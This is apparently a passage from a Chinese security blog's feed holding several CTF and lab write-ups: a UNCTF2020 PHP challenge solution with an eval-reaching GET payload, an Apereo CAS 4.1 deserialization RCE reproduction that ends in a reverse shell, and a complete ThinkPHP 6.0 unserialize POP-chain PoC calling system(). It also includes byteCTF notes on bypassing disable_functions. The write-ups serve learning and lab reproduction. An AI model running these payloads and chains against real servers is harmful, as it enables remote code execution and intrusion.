$&#123;$key&#125; = fuxkSQL(trim($value));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $&#123;$key&#125; = $_GET[$key] = str_replace(<span class="string">'"'</span>, <span class="string">'\"'</span>, str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, (trim($value))));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">getVars();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($source)) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有admin才能设置环境变量</span></span><br><span class="line"><span class="keyword">if</span> (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you can set config variables!!'</span> . <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/var\d&#123;1,2&#125;/'</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">"\$$key"</span> . <span class="string">'="'</span> . $GLOBALS[$key] . <span class="string">'";'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/var\d&#123;1,2&#125;/'</span>, $key)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> ($GLOBALS[$key]) . <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">                <span class="keyword">global</span> $&#123;$key&#125;;</span><br></pre></td></tr></table></figure><p>存在变量覆盖</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5($password) === $adminPassword<span class="comment">//只需要传入任意值和其md5值分给赋给$password和$adminPassword即可</span></span><br></pre></td></tr></table></figure><p>php弱类型比较</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha1($verif) == $verif</span><br></pre></td></tr></table></figure><p>只有以科学计数法0e开头的才可能满足条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> ($i5 = <span class="number">0</span>; $i5 &lt;= <span class="number">9999999999</span>; $i5++) &#123;</span><br><span class="line">    $res = <span class="string">'0e'</span> . $i5;</span><br><span class="line">    <span class="comment">//0e1290633704</span></span><br><span class="line">    <span class="keyword">if</span> ($res == hash(<span class="string">'sha1'</span>, $res)) &#123;</span><br><span class="line">        print_r($res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php复杂变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/var\d&#123;1,2&#125;/'</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">"\$$key"</span> . <span class="string">'="'</span> . $GLOBALS[$key] . <span class="string">'";'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>检测匹配以var开头跟1到2个数字字符的变量值，这里利用php复杂变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?source&#x3D;&amp;adminPassword&#x3D;c4ca4238a0b923820dcc509a6f75849b&amp;password&#x3D;1&amp;verif&#x3D;0e1290633704&amp;var1&#x3D;&#123;$_GET[1]&#125;&amp;var3&#x3D;$&#123;$var1()&#125;&amp;1&#x3D;phpinfo</span><br></pre></td></tr></table></figure><img src="/2020/11/11/UNCTF2020/12.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;UNCTF2020赛题部分WP&quot;&gt;&lt;a href=&quot;#UNCTF2020赛题部分WP&quot; class=&quot;headerlink&quot; title=&quot;UNCTF2020赛题部分WP&quot;&gt;&lt;/a&gt;UNCTF2020赛题部分WP
    
    </summary>
    
    
    
      <category term="UNCTF" scheme="http://yoursite.com/tags/UNCTF/"/>
    
  </entry>
  
  <entry>
    <title>Apereo-CAS-4.1-反序列化命令执行</title>
    <link href="http://yoursite.com/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://yoursite.com/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2020-11-08T05:29:14.000Z</published>
    <updated>2020-11-09T11:48:22.499Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Apereo-CAS-4-1-反序列化命令执行"><a href="#Apereo-CAS-4-1-反序列化命令执行" class="headerlink" title="Apereo-CAS-4.1-反序列化命令执行"></a>Apereo-CAS-4.1-反序列化命令执行<a id="more"></a></h2><h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>Apereo CAS 是一个开源的企业级单点登录系统，很多统一认证系统都是基于此系统二次开发</p><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>漏洞的成因是因为key的默认硬编码，导致可以通过反序列化配合Gadget使用</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li>Apereo-CAS&lt;=4.1.6</li></ul><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vulhub.org&#x2F;#&#x2F;environments&#x2F;apereo-cas&#x2F;4.1-rce&#x2F;</span><br><span class="line">centos</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>先来看cas中登录的配置文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#/WEB-INF/cas-servlet.cml:151行</span><br><span class="line">&lt;bean id=<span class="string">"loginHandlerAdapter"</span></span><br><span class="line">       <span class="class"><span class="keyword">class</span></span>=<span class="string">"org.jasig.cas.web.flow.SelectiveFlowHandlerAdapter"</span></span><br><span class="line">       p:supportedFlowId=<span class="string">"login"</span></span><br><span class="line">       p:flowExecutor-ref=<span class="string">"loginFlowExecutor"</span></span><br><span class="line">       p:flowUrlHandler-ref=<span class="string">"loginFlowUrlHandler"</span> /&gt;</span><br></pre></td></tr></table></figure><p>每次登录都会调用<code>SelectiveFlowHandlerAdapter</code>类中的<code>handle</code>方法进行处理，关键代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ModelAndView <span class="title">handle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        FlowHandler flowHandler = (FlowHandler)handler;</span><br><span class="line">        <span class="keyword">this</span>.checkAndPrepare(request, response, <span class="keyword">false</span>);      </span><br><span class="line">        <span class="comment">// flowExecutionKey是POST的“execution”的参数值，其中的flowUrlHandler在登录相关的配置文件中有配置“p:flowUrlHandler-ref="loginFlowUrlHandler"”</span></span><br><span class="line">        String flowExecutionKey = <span class="keyword">this</span>.flowUrlHandler.getFlowExecutionKey(request);</span><br><span class="line">        <span class="keyword">if</span> (flowExecutionKey != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ServletExternalContext context = <span class="keyword">this</span>.createServletExternalContext(request, response);               </span><br><span class="line"> <span class="comment">//用来恢复execute中存储的当前状态，漏洞从这里开始，其中flowExecutor在登录相关的配置文件中可以找到</span></span><br><span class="line"><span class="comment">//p:flowExecutor-ref="loginFlowExecutor"，loginFlowExecutor对应的类为“org.springframework.webflow.executor.FlowExecutorImpl”</span></span><br><span class="line">                FlowExecutionResult result = <span class="keyword">this</span>.flowExecutor.resumeExecution(flowExecutionKey, context);</span><br><span class="line">                <span class="keyword">this</span>.handleFlowExecutionResult(result, context, request, response, flowHandler);</span><br></pre></td></tr></table></figure><p>接着跟进<code>this.flowExecutor.resumeExecution</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.springframework.webflow.executor.FlowExecutorImpl.class</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> FlowExecutionResult <span class="title">resumeExecution</span><span class="params">(String flowExecutionKey, ExternalContext context)</span> <span class="keyword">throws</span> FlowException </span>&#123;</span><br><span class="line">        FlowExecutionResult var6;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">                logger.debug(<span class="string">"Resuming flow execution with key '"</span> + flowExecutionKey);</span><br><span class="line">            &#125;</span><br><span class="line">            ExternalContextHolder.setExternalContext(context);</span><br><span class="line">            <span class="comment">// 简单解析flowExecutionKey的数据到FlowExecutionKey对象，供后续使用</span></span><br><span class="line">            FlowExecutionKey key = <span class="keyword">this</span>.executionRepository.parseFlowExecutionKey(flowExecutionKey);</span><br><span class="line">            FlowExecutionLock lock = <span class="keyword">this</span>.executionRepository.getLock(key);</span><br><span class="line">            lock.lock();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//通过FlowExecutionKey恢复状态，其中处理不当导致了反序列化漏洞</span></span><br><span class="line">                FlowExecution flowExecution = <span class="keyword">this</span>.executionRepository.getFlowExecution(key);</span><br><span class="line">                flowExecution.resume(context);</span><br></pre></td></tr></table></figure><p>继续跟进<code>this.executionRepository.getFlowExecution</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.jasig.spring.webflow.plugin.ClientFlowExecutionRepository.class</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> FlowExecution <span class="title">getFlowExecution</span><span class="params">(FlowExecutionKey key)</span> <span class="keyword">throws</span> FlowExecutionRepositoryException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!(key <span class="keyword">instanceof</span> ClientFlowExecutionKey)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Expected instance of ClientFlowExecutionKey but got "</span> + key.getClass().getName());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 从上一步解析出的key对象中获取序列化相关的数据</span></span><br><span class="line">            <span class="keyword">byte</span>[] encoded = ((ClientFlowExecutionKey)key).getData();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//在this.transcoder.decode(encoded)代码解密中同时进行了反序列化恢复状态</span></span><br><span class="line">                ClientFlowExecutionRepository.SerializedFlowExecutionState state = (ClientFlowExecutionRepository.SerializedFlowExecutionState)<span class="keyword">this</span>.transcoder.decode(encoded);</span><br></pre></td></tr></table></figure><p>漏洞触发点在解密代码处</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">decode</span><span class="params">(<span class="keyword">byte</span>[] encoded)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] data;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            data = <span class="keyword">this</span>.cipherBean.decrypt(encoded);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Decryption error"</span>, var11);</span><br><span class="line">        &#125;</span><br><span class="line">        ByteArrayInputStream inBuffer = <span class="keyword">new</span> ByteArrayInputStream(data);</span><br><span class="line">        ObjectInputStream in = <span class="keyword">null</span>;</span><br><span class="line">        Object var5;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.compression) &#123;</span><br><span class="line">                in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> GZIPInputStream(inBuffer));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                in = <span class="keyword">new</span> ObjectInputStream(inBuffer);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 触发反序列化漏洞</span></span><br><span class="line">            var5 = in.readObject();</span><br></pre></td></tr></table></figure><p>调用了<code>cipherBean</code>对密文进行解密，之后进行了反序列化，调用的decode方法属于<code>EncryptedTranscoder</code>类，该类还定义了encode，直接调用<code>org.jasig.spring.webflow.plugin.EncryptedTranscoder#encode</code>生成加密字节数组后<code>base64</code>，加上<code>uuid-</code>构成execution的值</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问<code>/ip/cas/login</code></p><img src="/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.png" class=""><p>输入账号、密码，用burp抓包</p><img src="/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/2.png" class=""><p>可以看到这里有个<code>execution</code>参数，这里就是利用点，下面用给的<code>jar</code>包生成<code>poc</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">补充：</span><br><span class="line">这里要用到ysoserial这个java反序列化poc生成工具，可以从下面的网址下载</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;frohoff&#x2F;ysoserial</span><br><span class="line">具体的使用方法暂时还没有搞清楚（找个时间研究一下），找了个已经给了jar包的地址，如下</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;Apereo-CAS-Attack&#x2F;releases&#x2F;tag&#x2F;v1.0.0</span><br></pre></td></tr></table></figure><p>命令行进入到<code>apereo-cas-attack-1.0-SNAPSHOT-all.jar</code>所在目录，尝试使用在<code>/tmp</code>目录下创建<code>success</code>文件</p><img src="/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/3.png" class=""><p>在burp中把<code>execution</code>的参数值替换掉，Go一下</p><img src="/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/4.png" class=""><p>进入docker容器中进行查看</p><img src="/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/5.png" class=""><p>可以看到创建成功了，也就是说命令成功执行了</p><p>下面可以试试反弹shell</p><p>这里有个生成反弹shell的网址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.jackson-t.ca&#x2F;runtime-exec-payloads.html</span><br></pre></td></tr></table></figure><img src="/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/6.png" class=""><p>接着再生成poc，重复上面的步骤</p><p>在服务器上监听2000端口，打过去，可以看到shell成功反弹了</p><img src="/2020/11/08/Apereo-CAS-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/7.png" class=""><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;226149.html</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;caiqiiqi&#x2F;article&#x2F;details&#x2F;104943640</span><br><span class="line">https:&#x2F;&#x2F;www.00theway.org&#x2F;2020&#x2F;01&#x2F;04&#x2F;apereo-cas-rce&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Apereo-CAS-4-1-反序列化命令执行&quot;&gt;&lt;a href=&quot;#Apereo-CAS-4-1-反序列化命令执行&quot; class=&quot;headerlink&quot; title=&quot;Apereo-CAS-4.1-反序列化命令执行&quot;&gt;&lt;/a&gt;Apereo-CAS-4.1-反序列化命令执行
    
    </summary>
    
    
    
      <category term="maven" scheme="http://yoursite.com/tags/maven/"/>
    
  </entry>
  
  <entry>
    <title>tp6unserialize</title>
    <link href="http://yoursite.com/2020/11/04/tp6unserialize/"/>
    <id>http://yoursite.com/2020/11/04/tp6unserialize/</id>
    <published>2020-11-04T10:30:14.000Z</published>
    <updated>2020-11-10T13:12:45.272Z</updated>
    
    <content type="html"><![CDATA[<h3 id="tp6-0反序列化链子"><a href="#tp6-0反序列化链子" class="headerlink" title="tp6.0反序列化链子"></a>tp6.0反序列化链子<a id="more"></a></h3><p>有了<code>tp5.0.x</code>的经验，会好很多</p><p>还是<code>__destruct()</code>析构函数起手，<code>vendor/topthink/think-orm/src/Model.php</code>可用</p><img src="/2020/11/04/tp6unserialize/1.png" class=""><p>根据逻辑判断只有让<code>$this-&gt;lazySave</code>为<code>True</code>，才能进入<code>save()</code>，跟进</p><img src="/2020/11/04/tp6unserialize/2.png" class=""><p>可用方法为<code>updateData</code>，前面的<code>if</code>判断就不能让它成立,即下面的条件</p><ul><li><code>$this-&gt;isEmpty()</code>要返回false</li><li><code>$this-&gt;trigger(&#39;BeforeWrite&#39;)</code>要返回true</li><li><code>$this-&gt;exists</code>返回为true</li></ul><img src="/2020/11/04/tp6unserialize/3.png" class=""><p><code>data</code>为非空数组</p><img src="/2020/11/04/tp6unserialize/4.png" class=""><p><code>$this-&gt;withEvent</code>简单可控，让其为false就能够返回true</p><p>下面跟一下<code>updateData</code>方法</p><img src="/2020/11/04/tp6unserialize/5.png" class=""><p>需要绕过<code>return</code>，这里的<code>$data=$this-&gt;getChangeData()</code>要为非空</p><img src="/2020/11/04/tp6unserialize/6.png" class=""><p>这里让<code>$this-&gt;force</code>为true，直接返回前面构造的非空<code>$this-&gt;data</code></p><p>接着来看<code>checkAllowFields</code>,跟进</p><img src="/2020/11/04/tp6unserialize/7.png" class=""><p>这里的<code>$this-&gt;field</code>和<code>$this-&gt;schema</code>默认为空，条件成立进入else语句,跟进<code>db()</code></p><img src="/2020/11/04/tp6unserialize/8.png" class=""><p><code>db</code>中进行了字符串的拼接，也就是说<code>$this-&gt;name</code>或者<code>$this-&gt;suffix</code>为类对象时，就会触发<code>__toString()</code>方法</p><p>下面用到的还是 <code>Conversion</code>类中的 <code>__toString-&gt;toJson-&gt;toArray</code>一条,然后就到了 <code>getAttr</code>方法了</p><img src="/2020/11/04/tp6unserialize/9.png" class=""><p>下面接着跟进</p><img src="/2020/11/04/tp6unserialize/10.png" class=""><img src="/2020/11/04/tp6unserialize/11.png" class=""><p>满足<code>$this-&gt;withAttr[$key]</code>存在且<code>$this-&gt;withAttr[$key]</code>不为数组就可以触发命令执行</p><p>最终会把<code>$this-&gt;withAttr[$key]</code>作为函数名动态执行函数，而<code>$value</code>作为参数，就可以利用执行系统函数达到命令执行</p><p>pop调用链</p><img src="/2020/11/04/tp6unserialize/13.png" class=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">POC</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>;</span><br><span class="line"><span class="keyword">trait</span> Attribute</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> $data = [<span class="string">"peguin"</span> =&gt; <span class="string">"whoami"</span>];</span><br><span class="line">    <span class="keyword">private</span> $withAttr = [<span class="string">"peguin"</span> =&gt; <span class="string">"system"</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">private</span> $lazySave;</span><br><span class="line">    <span class="keyword">protected</span> $withEvent;</span><br><span class="line">    <span class="keyword">private</span> $exists;</span><br><span class="line">    <span class="keyword">private</span> $force;</span><br><span class="line">    <span class="keyword">protected</span> $table;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($obj = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;lazySave = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;withEvent = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;exists = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;force = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;table = $obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Pivot();</span><br><span class="line">$b = <span class="keyword">new</span> Pivot($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br></pre></td></tr></table></figure><img src="/2020/11/04/tp6unserialize/12.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;tp6-0反序列化链子&quot;&gt;&lt;a href=&quot;#tp6-0反序列化链子&quot; class=&quot;headerlink&quot; title=&quot;tp6.0反序列化链子&quot;&gt;&lt;/a&gt;tp6.0反序列化链子
    
    </summary>
    
    
    
      <category term="tp" scheme="http://yoursite.com/tags/tp/"/>
    
  </entry>
  
  <entry>
    <title>byteCTF2020</title>
    <link href="http://yoursite.com/2020/11/04/byteCTF2020/"/>
    <id>http://yoursite.com/2020/11/04/byteCTF2020/</id>
    <published>2020-11-04T05:27:32.000Z</published>
    <updated>2020-11-04T06:35:03.224Z</updated>
    
    <content type="html"><![CDATA[<p>这次比赛web题好难，盯着爬虫那题，还是没整出来，来复现吧<a id="more"></a></p><h3 id="Wallbreaker-2020"><a href="#Wallbreaker-2020" class="headerlink" title="Wallbreaker 2020"></a>Wallbreaker 2020</h3><p>这道题官方的预期解估计会在决赛之后放出来，当时好像就1解</p><p>题目的给的源码很简单，但是…看题吧</p><img src="/2020/11/04/byteCTF2020/1.png" class=""><p>下意识会先去看<code>phpinfo</code>,找到<code>disable_function</code></p><img src="/2020/11/04/byteCTF2020/2.png" class=""><p>预料之中，基本上把命令执行的方法都ban完了</p><p>后面想着用<code>file_put_contents</code>写个小马进去用蚁剑连一下看看，突然发现题目已经给了，那就直接连吧</p><p>连上之后，只有<code>/var/www/html</code>有可读权限，其他路径都没权限访问</p><p>这里想到之前碰到的用<code>glob://</code>协议可以读取目录中的文件</p><img src="/2020/11/04/byteCTF2020/3.png" class=""><p>直接用<code>php</code>手册里的exp就行</p><img src="/2020/11/04/byteCTF2020/4.png" class=""><p>可以看到在根目录下面有<code>flag</code>和<code>readflag</code>文件</p><p>下面就是要想办法调用<code>readflag</code>，这样应该就能拿到flag了</p><p>由于预期解不用<code>pwn</code>，这里就用非预期解的来做,根据官方<code>wp</code>中给出的链接去看看非预期exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mm0r1&#x2F;exploits&#x2F;blob&#x2F;master&#x2F;php7-backtrace-bypass&#x2F;exploit.php</span><br></pre></td></tr></table></figure><p>这个exp之前就有用过的，先直接试试，但是问题来了，没办法上传</p><p>这里要用到上面看到根路径下的文件，尝试访问<code>/tmp</code>，成功进入，并且可读可写</p><img src="/2020/11/04/byteCTF2020/5.png" class=""><p>尝试包含上传的exp，包含失败</p><img src="/2020/11/04/byteCTF2020/6.png" class=""><p>根据官方文档的提示，把24行改为<code>(new Error)-&gt;getTrace()</code>,再次上传</p><img src="/2020/11/04/byteCTF2020/7.png" class=""><p>下面只要把执行的命令改成<code>/readflag</code>，再包含即可</p><img src="/2020/11/04/byteCTF2020/8.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次比赛web题好难，盯着爬虫那题，还是没整出来，来复现吧
    
    </summary>
    
    
    
      <category term="byte" scheme="http://yoursite.com/tags/byte/"/>
    
  </entry>
  
  <entry>
    <title>tp5.1.x-unserialize</title>
    <link href="http://yoursite.com/2020/11/02/tp5-1-x-unserialize/"/>
    <id>http://yoursite.com/2020/11/02/tp5-1-x-unserialize/</id>
    <published>2020-11-02T11:08:58.000Z</published>
    <updated>2020-11-02T14:09:59.785Z</updated>
    
